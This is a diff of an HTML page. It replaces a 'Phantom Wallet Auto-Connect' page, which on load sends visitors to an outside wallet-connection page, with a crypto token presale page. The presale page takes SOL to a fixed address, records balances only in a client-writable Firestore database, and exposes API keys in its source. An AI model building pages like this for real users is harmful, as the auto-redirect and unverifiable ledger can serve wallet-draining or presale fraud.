@@ -3,95 +3,963 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phantom Wallet Auto-Connect</title>
+    <title>XYZ Innovagence Presale</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Montserrat:wght@300;400;600&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/wallet-adapter-wallets@0.19.15/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/wallet-adapter-base@0.9.20/lib/index.iife.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        :root {
+            --primary: #ffffff;
+            --secondary: #aaaaaa;
+            --dark: #121212;
+            --darker: #000000;
+            --light: #ffffff;
+            --glass: rgba(30, 30, 30, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --success: #00ff88;
+            --error: #ff0033;
+        }
+
+        * {
             margin: 0;
-            background-color: #f5f5f5;
+            padding: 0;
+            box-sizing: border-box;
         }
+
+        body {
+            background: var(--darker);
+            color: var(--light);
+            font-family: 'Montserrat', sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
         .container {
-            text-align: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
         }
-        .phantom-button {
-            background-color: #4e44ce;
-            color: white;
-            border: none;
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            position: relative;
+            z-index: 10;
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 28px;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+
+        .connect-wallet {
+            background: transparent;
+            border: 1px solid var(--primary);
             padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 8px;
+            border-radius: 50px;
+            color: var(--primary);
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 500;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .connect-wallet:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .connect-wallet:active {
+            transform: translateY(0);
+        }
+
+        .wallet-connected {
             display: flex;
             align-items: center;
+            gap: 10px;
+            background: var(--glass);
+            padding: 10px 20px;
+            border-radius: 50px;
+            border: 1px solid var(--primary);
+        }
+
+        .wallet-address {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.9rem;
+            color: var(--primary);
+        }
+
+        .wallet-icon {
+            width: 20px;
+            height: 20px;
+            background: var(--primary);
+            border-radius: 50%;
+        }
+
+        .hero {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             justify-content: center;
+            min-height: 70vh;
+            text-align: center;
+            position: relative;
+            padding: 40px 0;
+        }
+
+        .hero h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 4rem;
+            margin-bottom: 20px;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            animation: pulse 2s infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% {
+                text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+            }
+            100% {
+                text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+            }
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin-bottom: 40px;
+            line-height: 1.6;
+            color: var(--secondary);
+        }
+
+        .presale-container {
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 800px;
             margin: 0 auto;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
-        .phantom-button:hover {
-            background-color: #3a30b0;
+
+        .presale-container:hover {
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
         }
-        .phantom-button img {
-            width: 24px;
-            margin-right: 10px;
+
+        .presale-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
         }
-        #status {
+
+        .presale-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.8rem;
+            color: var(--primary);
+        }
+
+        .presale-stats {
+            display: flex;
+            gap: 20px;
+        }
+
+        .stat-box {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid var(--glass-border);
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            color: var(--secondary);
+            margin-bottom: 5px;
+        }
+
+        .stat-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            color: var(--primary);
+        }
+
+        .presale-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .presale-option {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .presale-option:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+        }
+
+        .presale-option.active {
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .presale-option-amount {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+
+        .presale-option-label {
+            font-size: 0.9rem;
+            color: var(--secondary);
+        }
+
+        .presale-details {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .detail-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .detail-label {
+            color: var(--secondary);
+        }
+
+        .detail-value {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--primary);
+        }
+
+        .buy-button {
+            width: 100%;
+            background: transparent;
+            border: 1px solid var(--primary);
+            padding: 15px;
+            border-radius: 10px;
+            color: var(--primary);
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 500;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .buy-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .buy-button:disabled {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--secondary);
+            cursor: not-allowed;
+            border-color: var(--secondary);
+        }
+
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            background: var(--primary);
+            border-radius: 50%;
+            opacity: 0.1;
+            animation: float linear infinite;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+            }
+            100% {
+                transform: translateY(-100vh) rotate(360deg);
+            }
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--primary);
+            border-radius: 10px;
+            padding: 15px 20px;
+            color: white;
+            font-family: 'Orbitron', sans-serif;
+            transform: translateX(200%);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.success {
+            border-color: var(--success);
+        }
+
+        .notification.error {
+            border-color: var(--error);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            margin: 10% auto;
+            padding: 30px;
+            width: 90%;
+            max-width: 600px;
+            animation: modalFadeIn 0.3s;
+        }
+
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: translateY(-50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .close-modal {
+            color: var(--secondary);
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .close-modal:hover {
+            color: var(--primary);
+        }
+
+        .modal-title {
+            font-family: 'Orbitron', sans-serif;
+            margin-bottom: 20px;
+            color: var(--primary);
+        }
+
+        .deposit-history {
+            max-height: 400px;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+
+        .deposit-item {
+            padding: 15px 0;
+            border-bottom: 1px solid var(--glass-border);
+            display: flex;
+            justify-content: space-between;
+            transition: background 0.3s;
+        }
+
+        .deposit-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .deposit-date {
+            font-size: 0.9rem;
+            color: var(--secondary);
+        }
+
+        .deposit-tx {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8rem;
+            color: var(--primary);
+            margin-top: 5px;
+        }
+
+        .deposit-amount {
+            text-align: right;
+        }
+
+        .deposit-sol {
+            color: var(--primary);
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .deposit-xyz {
+            color: var(--success);
+            font-family: 'Orbitron', sans-serif;
+            margin-top: 5px;
+        }
+
+        .view-history {
+            display: block;
+            text-align: center;
             margin-top: 20px;
-            color: #666;
+            color: var(--secondary);
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .view-history:hover {
+            color: var(--primary);
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .presale-options {
+                grid-template-columns: 1fr;
+            }
+            
+            .presale-stats {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .modal-content {
+                margin: 20% auto;
+                width: 95%;
+            }
         }
     </style>
 </head>
 <body>
+    <div class="particles" id="particles"></div>
+    
     <div class="container">
-        <button id="connectPhantom" class="phantom-button">
-            <img src="https://phantom.app/favicon.ico" alt="Phantom Logo">
-            Connect & Open in Phantom
-        </button>
-        <p id="status">Click the button to open in Phantom Wallet.</p>
-    </div>
-
-    <script>
-        document.getElementById('connectPhantom').addEventListener('click', async function() {
-            const url = 'https://zyperinnovative.github.io/cypher/web3connection%20(1).html';
-            const statusEl = document.getElementById('status');
+        <header>
+            <div class="logo">XYZ INNOVAGENCE</div>
+            <button class="connect-wallet" id="connectWallet">CONNECT WALLET</button>
+            <div class="wallet-connected" id="walletConnected" style="display: none;">
+                <div class="wallet-icon"></div>
+                <div class="wallet-address" id="walletAddress"></div>
+            </div>
+        </header>
+        
+        <section class="hero">
+            <h1>PRESALE IS LIVE</h1>
+            <p>Join the future of decentralized innovation with XYZ Innovagence. Purchase tokens now at $0.01 each before the official launch.</p>
             
-            // Check if Phantom is installed (Browser Extension)
-            if (window.phantom?.solana?.isPhantom) {
-                try {
-                    statusEl.textContent = "Connecting to Phantom...";
-                    
-                    // Request connection to Phantom
-                    const response = await window.phantom.solana.connect();
-                    const publicKey = response.publicKey.toString();
-                    
-                    statusEl.textContent = "Connected! Opening link...";
-                    window.open(url, '_blank');
-                } catch (err) {
-                    statusEl.textContent = "Connection failed. Opening in browser instead...";
-                    window.open(url, '_blank');
-                }
-            } 
-            // Try Phantom Mobile deep link
-            else {
-                statusEl.textContent = "Attempting to open in Phantom Mobile...";
-                const phantomScheme = `phantom://browse/${encodeURIComponent(url)}`;
-                window.location.href = phantomScheme;
+            <div class="presale-container">
+                <div class="presale-header">
+                    <div class="presale-title">XYZ TOKEN PRESALE</div>
+                    <div class="presale-stats">
+                        <div class="stat-box">
+                            <div class="stat-label">PRICE</div>
+                            <div class="stat-value">$0.01</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-label">STAGE</div>
+                            <div class="stat-value">1/5</div>
+                        </div>
+                    </div>
+                </div>
                 
-                // Fallback if Phantom app is not installed
-                setTimeout(() => {
-                    statusEl.textContent = "Phantom not detected. Opening in browser...";
-                    window.open(url, '_blank');
-                }, 1000);
-            }
-        });
+                <div class="presale-options">
+                    <div class="presale-option" data-amount="0.08">
+                        <div class="presale-option-amount">0.08 SOL</div>
+                        <div class="presale-option-label">≈ 800 XYZ</div>
+                    </div>
+                    <div class="presale-option" data-amount="0.1">
+                        <div class="presale-option-amount">0.1 SOL</div>
+                        <div class="presale-option-label">≈ 1000 XYZ</div>
+                    </div>
+                    <div class="presale-option" data-amount="0.5">
+                        <div class="presale-option-amount">0.5 SOL</div>
+                        <div class="presale-option-label">≈ 5000 XYZ</div>
+                    </div>
+                </div>
+                
+                <div class="presale-details">
+                    <div class="detail-row">
+                        <div class="detail-label">Your Contribution</div>
+                        <div class="detail-value" id="contribution">0 SOL</div>
+                    </div>
+                    <div class="detail-row">
+                        <div class="detail-label">Your XYZ Tokens</div>
+                        <div class="detail-value" id="xyzTokens">0 XYZ</div>
+                    </div>
+                    <div class="detail-row">
+                        <div class="detail-label">Token Release</div>
+                        <div class="detail-value">TGE + 30 Days</div>
+                    </div>
+                </div>
+                
+                <button class="buy-button" id="buyButton" disabled>CONNECT WALLET TO PARTICIPATE</button>
+                <span class="view-history" id="viewHistory">View Deposit History</span>
+            </div>
+        </section>
+    </div>
+    
+    <div class="notification" id="notification"></div>
 
-        // Optional: Auto-trigger on page load (remove if not needed)
-        window.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('connectPhantom').click();
+    <div class="modal" id="historyModal">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <h3 class="modal-title">YOUR DEPOSIT HISTORY</h3>
+            <div class="deposit-history" id="depositHistory">
+                <div style="text-align: center; padding: 20px; color: var(--secondary);">Loading history...</div>
+            </div>
+        </div>
+    </div>
+<script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDIwoUIMJrJQeLBD9vijsfIUXG9BgaGSPs",
+            authDomain: "miner-zyx.firebaseapp.com",
+            projectId: "miner-zyx",
+            storageBucket: "miner-zyx.appspot.com",
+            messagingSenderId: "430019680448",
+            appId: "1:430019680448:web:d066b8aaf4355907e1b525",
+            measurementId: "G-V6SDWYH6M2"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // DOM elements
+        const connectWalletBtn = document.getElementById('connectWallet');
+        const walletConnectedDiv = document.getElementById('walletConnected');
+        const walletAddressSpan = document.getElementById('walletAddress');
+        const buyButton = document.getElementById('buyButton');
+        const contributionSpan = document.getElementById('contribution');
+        const xyzTokensSpan = document.getElementById('xyzTokens');
+        const notification = document.getElementById('notification');
+        const presaleOptions = document.querySelectorAll('.presale-option');
+        const viewHistoryBtn = document.getElementById('viewHistory');
+        const historyModal = document.getElementById('historyModal');
+        const depositHistoryDiv = document.getElementById('depositHistory');
+        const closeModal = document.querySelector('.close-modal');
+
+        // App state
+        let wallet = null;
+        let walletAddress = null;
+        let selectedAmount = null;
+        let connection = null;
+        let isProcessing = false;
+
+        // Initialize Solana connection
+        async function initSolana() {
+            const solana = window.solana;
+            if (!solana) {
+                showNotification('Solana wallet not detected. Please install Phantom or other Solana wallet.', 'error');
+                return;
+            }
+
+            connection = new solanaWeb3.Connection('https://mainnet.helius-rpc.com/?api-key=ffa4267c-d28d-4bce-baf4-6cca12c26952', 'confirmed');
+            
+            // Check if wallet is already connected from localStorage
+            const savedAddress = localStorage.getItem('SolAddress');
+            if (savedAddress) {
+                walletAddress = savedAddress;
+                walletConnectedDiv.style.display = 'flex';
+                connectWalletBtn.style.display = 'none';
+                walletAddressSpan.textContent = shortenAddress(walletAddress);
+                buyButton.textContent = 'SELECT AMOUNT TO BUY XYZ';
+                buyButton.disabled = false;
+                
+                // Load user data from Firestore
+                await loadUserData(walletAddress);
+            }
+        }
+
+        // Connect wallet handler
+        async function connectWallet() {
+            const solana = window.solana;
+            if (!solana) {
+                showNotification('Solana wallet not detected. Please install Phantom or other Solana wallet.', 'error');
+                return;
+            }
+
+            try {
+                // Connect to wallet
+                const response = await solana.connect();
+                wallet = response;
+                walletAddress = wallet.publicKey.toString();
+                
+                // Save to localStorage
+                localStorage.setItem('SolAddress', walletAddress);
+                
+                // Update UI
+                walletConnectedDiv.style.display = 'flex';
+                connectWalletBtn.style.display = 'none';
+                walletAddressSpan.textContent = shortenAddress(walletAddress);
+                buyButton.textContent = 'SELECT AMOUNT TO BUY XYZ';
+                buyButton.disabled = false;
+                
+                // Save wallet to Firestore
+                await saveWalletToFirestore(walletAddress);
+                
+                // Load user data
+                await loadUserData(walletAddress);
+                
+                showNotification('Wallet connected successfully!', 'success');
+            } catch (error) {
+                console.error('Error connecting wallet:', error);
+                showNotification('Failed to connect wallet. Please try again.', 'error');
+            }
+        }
+
+        // Save wallet to Firestore
+        async function saveWalletToFirestore(address) {
+            try {
+                const walletRef = db.collection('PresaleAddress').doc(address);
+                const walletDoc = await walletRef.get();
+                
+                if (!walletDoc.exists) {
+                    await walletRef.set({
+                        CreatedAt: new Date().toISOString(),
+                        TotalSolDeposits: 0,
+                        TotalXyzBalance: 0,
+                        LastUpdated: new Date().toISOString()
+                    });
+                }
+            } catch (error) {
+                console.error('Error saving wallet to Firestore:', error);
+                throw error;
+            }
+        }
+
+        // Record a new deposit
+        async function recordDeposit(address, amountSol, xyzAllocated, transactionId) {
+            try {
+                const walletRef = db.collection('PresaleAddress').doc(address);
+                const depositsRef = walletRef.collection('deposits');
+                
+                // Add deposit record to subcollection
+                await depositsRef.doc(transactionId).set({
+                    amountSol: amountSol,
+                    xyzAllocated: xyzAllocated,
+                    timestamp: new Date().toISOString(),
+                    usdValue: amountSol * 100 // Assuming 1 SOL = $100
+                });
+                
+                // Update main wallet document
+                const walletDoc = await walletRef.get();
+                const currentData = walletDoc.data();
+                
+                await walletRef.update({
+                    TotalSolDeposits: currentData.TotalSolDeposits + amountSol,
+                    TotalXyzBalance: currentData.TotalXyzBalance + xyzAllocated,
+                    LastUpdated: new Date().toISOString()
+                });
+                
+                return true;
+            } catch (error) {
+                console.error('Error recording deposit:', error);
+                throw error;
+            }
+        }
+
+        // Load user data with deposit history
+        async function loadUserData(address) {
+            try {
+                const walletRef = db.collection('PresaleAddress').doc(address);
+                const walletDoc = await walletRef.get();
+                
+                if (!walletDoc.exists) return;
+                
+                const walletData = walletDoc.data();
+                contributionSpan.textContent = `${walletData.TotalSolDeposits} SOL`;
+                xyzTokensSpan.textContent = `${walletData.TotalXyzBalance} XYZ`;
+                
+                return walletData;
+            } catch (error) {
+                console.error('Error loading user data:', error);
+                throw error;
+            }
+        }
+
+        // Load deposit history
+        async function loadDepositHistory(address) {
+            try {
+                const depositsRef = db.collection('PresaleAddress').doc(address).collection('deposits');
+                const querySnapshot = await depositsRef.orderBy('timestamp', 'desc').get();
+                
+                const deposits = [];
+                querySnapshot.forEach(doc => {
+                    deposits.push({
+                        id: doc.id,
+                        ...doc.data()
+                    });
+                });
+                
+                return deposits;
+            } catch (error) {
+                console.error('Error loading deposit history:', error);
+                throw error;
+            }
+        }
+
+        // Buy XYZ tokens
+        async function buyXyzTokens(amount) {
+            if (!wallet || !walletAddress) {
+                showNotification('Please connect your wallet first.', 'error');
+                return;
+            }
+
+            if (isProcessing) return;
+            isProcessing = true;
+            
+            try {
+                // Update button to show loading state
+                const originalText = buyButton.textContent;
+                buyButton.innerHTML = `PROCESSING <span class="loading"></span>`;
+                buyButton.disabled = true;
+                
+                // Convert amount to lamports
+                const lamports = amount * solanaWeb3.LAMPORTS_PER_SOL;
+                const destinationAddress = new solanaWeb3.PublicKey('99R4aBwwjXxeT9ukG2o1ppGE7GFEPqAWt94MvHhxoxgf');
+                
+                // Create transaction
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: wallet.publicKey,
+                        toPubkey: destinationAddress,
+                        lamports: lamports
+                    })
+                );
+                
+                // Set recent blockhash
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = wallet.publicKey;
+                
+                // Sign and send transaction
+                const signedTransaction = await wallet.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+                
+                // Confirm transaction
+                await connection.confirmTransaction(signature, 'confirmed');
+                
+                // Calculate XYZ tokens (1 SOL = $100, $0.01 per XYZ)
+                const solToUsd = 100; // Example rate - replace with actual price fetch
+                const usdAmount = amount * solToUsd;
+                const xyzAmount = usdAmount / 0.01;
+                
+                // Record deposit in Firestore
+                await recordDeposit(walletAddress, amount, xyzAmount, signature);
+                
+                // Update UI
+                await loadUserData(walletAddress);
+                
+                showNotification(`Successfully purchased ${xyzAmount.toLocaleString()} XYZ tokens!`, 'success');
+            } catch (error) {
+                console.error('Error buying XYZ tokens:', error);
+                showNotification('Transaction failed. Please try again.', 'error');
+            } finally {
+                // Reset button state
+                buyButton.textContent = originalText || `BUY XYZ FOR ${selectedAmount} SOL`;
+                buyButton.disabled = false;
+                isProcessing = false;
+            }
+        }
+
+        // Show deposit history modal
+        async function showHistoryModal() {
+            if (!walletAddress) {
+                showNotification('Please connect your wallet first.', 'error');
+                return;
+            }
+
+            try {
+                depositHistoryDiv.innerHTML = '<div style="text-align: center; padding: 20px; color: var(--secondary);">Loading history...</div>';
+                historyModal.style.display = 'block';
+                
+                const deposits = await loadDepositHistory(walletAddress);
+                
+                if (deposits.length === 0) {
+                    depositHistoryDiv.innerHTML = '<div style="text-align: center; padding: 20px; color: var(--secondary);">No deposits yet</div>';
+                    return;
+                }
+                
+                depositHistoryDiv.innerHTML = '';
+                deposits.forEach(deposit => {
+                    const item = document.createElement('div');
+                    item.className = 'deposit-item';
+                    item.innerHTML = `
+                        <div>
+                            <div class="deposit-date">${new Date(deposit.timestamp).toLocaleString()}</div>
+                            <div class="deposit-tx">TX: ${shortenAddress(deposit.id)}</div>
+                        </div>
+                        <div class="deposit-amount">
+                            <div class="deposit-sol">${deposit.amountSol} SOL</div>
+                            <div class="deposit-xyz">+${deposit.xyzAllocated.toLocaleString()} XYZ</div>
+                        </div>
+                    `;
+                    depositHistoryDiv.appendChild(item);
+                });
+            } catch (error) {
+                console.error('Error loading history:', error);
+                depositHistoryDiv.innerHTML = '<div style="text-align: center; padding: 20px; color: var(--error);">Failed to load history</div>';
+            }
+        }
+
+        // Show notification
+        function showNotification(message, type = 'info') {
+            notification.textContent = message;
+            notification.className = 'notification';
+            notification.classList.add(type, 'show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 5000);
+        }
+
+        // Shorten wallet address
+        function shortenAddress(address) {
+            if (!address) return '';
+            return `${address.slice(0, 4)}...${address.slice(-4)}`;
+        }
+
+        // Create particles
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 30;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Random size between 1px and 3px
+                const size = Math.random() * 2 + 1;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                // Random position
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.top = `${Math.random() * 100}vh`;
+                
+                // Random animation duration between 10s and 20s
+                const duration = Math.random() * 10 + 10;
+                particle.style.animationDuration = `${duration}s`;
+                
+                // Random delay
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            createParticles();
+            initSolana();
+            
+            // Connect wallet button
+            connectWalletBtn.addEventListener('click', connectWallet);
+            
+            // Presale option selection
+            presaleOptions.forEach(option => {
+                option.addEventListener('click', () => {
+                    // Remove active class from all options
+                    presaleOptions.forEach(opt => opt.classList.remove('active'));
+                    
+                    // Add active class to selected option
+                    option.classList.add('active');
+                    
+                    // Set selected amount
+                    selectedAmount = parseFloat(option.dataset.amount);
+                    
+                    // Update buy button
+                    buyButton.textContent = `BUY XYZ FOR ${selectedAmount} SOL`;
+                    buyButton.disabled = false;
+                });
+            });
+            
+            // Buy button
+            buyButton.addEventListener('click', () => {
+                if (selectedAmount) {
+                    buyXyzTokens(selectedAmount);
+                } else {
+                    showNotification('Please select an amount first.', 'error');
+                }
+            });
+            
+            // View history button
+            viewHistoryBtn.addEventListener('click', showHistoryModal);
+            
+            // Close modal
+            closeModal.addEventListener('click', () => {
+                historyModal.style.display = 'none';
+            });
+            
+            // Close modal when clicking outside
+            window.addEventListener('click', (event) => {
+                if (event.target === historyModal) {
+                    historyModal.style.display = 'none';
+                }
+            });
         });
     </script>
 </body>
-</html>
+</html>         
